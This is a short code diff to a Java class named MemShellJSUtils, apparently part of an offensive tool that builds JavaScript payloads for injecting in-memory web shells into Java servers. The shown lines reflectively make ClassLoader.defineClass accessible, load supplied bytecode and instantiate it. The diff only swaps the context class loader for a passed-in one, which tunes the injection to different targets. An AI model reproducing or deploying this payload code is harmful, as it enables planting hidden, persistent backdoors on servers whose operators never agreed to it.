@@ -37,7 +37,7 @@ public class MemShellJSUtils {
                                     "    var clsInt = java.lang.Integer.TYPE;" +
                                     "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);" +
                                     "    defineClass.setAccessible(true);" +
-                                    "    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));" +
+                                    "    var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));" +
                                     "    clazz.newInstance();" +
                                     "}");
                 case MemShellClassFactory.BIGINTEGER:
@@ -55,7 +55,7 @@ public class MemShellJSUtils {
                                     "    var clsInt = java.lang.Integer.TYPE;" +
                                     "    var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);" +
                                     "    defineClass.setAccessible(true);" +
-                                    "    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));" +
+                                    "    var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));" +
                                     "    clazz.newInstance();" +
                                     "}");
                 case MemShellClassFactory.BCEL:
